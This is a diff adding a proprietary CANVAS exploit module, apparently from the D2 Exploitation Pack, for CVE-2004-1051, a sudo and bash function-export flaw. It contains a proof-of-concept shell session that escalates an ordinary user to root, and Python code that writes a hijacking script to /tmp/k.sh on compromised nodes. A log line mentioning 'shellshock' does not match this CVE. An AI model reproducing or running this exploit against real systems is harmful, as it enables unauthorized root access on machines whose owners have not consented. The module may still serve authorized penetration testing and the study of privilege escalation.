@@ -1,0 +1,180 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+from exploitutils import *
+import libs.canvasos as canvasos
+
+
+NAME = "Sudo bash command execution Vulnerability"
+VERSION = "0.1"
+DESCRIPTION = "Bash scripts run via Sudo can be subverted"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["Linux"], ["FreeBSD"], ["MacOSX"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2004/11/17"
+DOCUMENTATION["VersionsAffected"] = "All versions prior to 1.6.8p2"
+DOCUMENTATION["References"] = "http://www.sudo.ws/sudo/alerts/bash_functions.html"
+DOCUMENTATION["CVE Name"] = "CVE 2004-1051"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2004-1051"
+
+NOTES = """
+A new vulnerability in sudo give a malicious user with sudo access
+to a bash script the ability to run arbitrary commands. See
+http://www.sudo.ws/sudo/alerts/bash_functions.html for more details.
+
+Example:
+sh-2.05b# cat /etc/sudoers
+[...]
+compaq  ALL=/etc/init.d/gpm
+[...]
+
+sh-2.05b$ id
+uid=1000(compaq) gid=1000(compaq) groupes=1000(compaq)
+$ head /etc/init.d/gpm
+#!/bin/sh
+#
+# Start Mouse event server
+
+PIDFILE=/var/run/gpm.pid
+GPM=/usr/sbin/gpm
+CFG=/etc/gpm.conf
+
+test -x $GPM || exit 0
+
+sh-2.05b$ cat x.sh
+#!/bin/sh
+
+test()
+{
+/bin/sh
+}
+
+export -f test
+sudo /etc/init.d/gpm stop
+
+sh-2.05b$ ls -alp x.sh
+-rwxr-xr-x  1 compaq compaq 74 2004-11-15 08:05 x.sh
+sh-2.05b$ ./x.sh
+sh-2.05b# id
+uid=0(root) gid=0(root) groupes=0(root)
+sh-2.05b#
+"""
+
+DOCUMENTATION["Notes"] = NOTES
+
+
+class theexploit (canvasexploit):
+    
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME
+		self.sudopath = "/usr/bin/sudo"
+		self.script = ""
+		self.cmdbash = "test"
+		return
+
+	def getArgs(self):
+		self.sudopath = self.argsDict.get("sudopath",self.sudopath)
+		self.script = self.argsDict.get("script",self.script)
+		self.cmdbash = self.argsDict.get("cmdbash",self.cmdbash)
+
+		if not self.sudopath or not self.script or not self.cmdbash:
+			self.log("Arguments are missing !")
+			return 1
+
+		return 0
+
+	def run(self):
+
+		i = self.getArgs()
+		if i:
+			return
+
+		self.setInfo("%s (in progress)"%(NAME))
+
+		exploit = """
+#!/bin/sh
+
+%s()
+{
+	/bin/sh
+}
+
+export -f %s
+%s -S %s
+""" % (self.cmdbash, self.cmdbash, self.sudopath, self.script)
+		
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			nodename = node.getname()
+			caps = node.capabilities
+
+			self.node = node
+			self.libc = node.shell.libc
+			self.localfunctions = self.libc.localfunctions.copy()
+			self.arch = node.shell.arch
+			self.localcache = {}
+			self.delim = "#"
+			self.connection = node.shell.connection
+
+			(uid,euid,gid,egid) = node.shell.ids()
+			self.log("ID -a result: %d %d %d %d" % (uid,euid,gid,egid))
+			if uid == 0 or euid == 0:
+				self.log("We are already uid or euid 0, so we don't need to do this on node %s..." % nodename)
+				continue
+
+			# check if sudo is present
+			ret, fs = node.shell.stat(self.sudopath)
+			if ret != 0:
+				self.log ("can't find %s" % self.sudopath)
+				continue
+				
+
+			O_RDWR = node.shell.libc.getdefine('O_RDWR')
+			O_CREAT = node.shell.libc.getdefine('O_CREAT')
+
+			filename = "/tmp/k.sh"
+
+			fd = node.shell.open(filename, O_RDWR|O_CREAT, 0755)
+			if fd < 0:
+				self.log("couldn't open %s..." % filename)
+				continue
+				
+			r = node.shell.write(fd, exploit)
+			if r != 1:
+				self.log("write failed.")
+				continue
+
+			node.shell.close(fd)
+
+			self.log("file %s wrote successfully" % filename)
+
+			self.log ("now run shellshock and then %s...\n" % filename)
+			self.log ("don't forget to unlink %s...\n" % filename)
+
+			self.setInfo("%s (finished)"%(NAME))
+
+			return 1
+
+if __name__=="__main__":
+    print "This module is meant to be run only within CANVAS"
+
